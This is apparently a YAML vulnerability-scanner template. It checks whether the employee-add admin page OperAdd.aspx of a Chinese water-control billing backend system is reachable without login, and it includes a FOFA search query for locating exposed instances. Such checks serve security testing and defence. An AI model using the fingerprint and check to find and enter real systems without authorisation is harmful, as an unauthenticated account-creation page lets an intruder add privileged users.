id: poc-yaml-wccbms-operadd-aspx-unauthorized-access
info:
  name: 水控消费后台管理系统 OperAdd.aspx 未授权访问漏洞
  severity: medium
  tags:
  - 未授权访问
  finger: 水控消费后台管理系统
  fofa: body="登陆页" && body="水控消费后台管理系统"
requests:
- method: GET
  path: /Auth/Login.aspx
  expression: status_code == 200 && contains(body,"水控消费后台管理系统")
- method: GET
  path: /Auth/OperAdd.aspx
  expression: status_code == 200 && contains(body,"员工管理") && contains(body,"添加员工")
    && contains(body,"确认密码:") && contains(body,"角色:")
variables: {}
transport: http
